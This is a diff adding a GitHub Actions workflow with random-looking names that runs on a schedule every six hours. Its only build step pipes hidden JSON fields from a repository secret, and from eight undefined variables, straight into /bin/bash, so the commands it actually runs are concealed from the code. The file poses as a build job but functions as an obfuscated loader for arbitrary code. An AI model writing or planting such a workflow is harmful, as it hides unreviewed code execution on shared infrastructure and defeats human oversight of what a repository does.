@@ -1,0 +1,25 @@
+name: xuzhibai3856
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuzhibai3856
+        env:
+          fmkc51: ${{ secrets.fmkc51 }}
+        run: |
+          echo $fmkc51 | jq -r .g453 | /bin/bash
+          echo $ttijm0 | jq -r .gbcjl6 | /bin/bash
+          echo $y59375 | jq -r .z657 | /bin/bash
+          echo $sx8 | jq -r .tukq5526 | /bin/bash
+          echo $yztyw7 | jq -r .wzkc85379 | /bin/bash
+          echo $knk14981 | jq -r .toxgh1 | /bin/bash
+          echo $xa86302 | jq -r .pnm04429 | /bin/bash
+          echo $dg9 | jq -r .tm847 | /bin/bash
+          echo $pr55944 | jq -r .ylk8 | /bin/bash
+
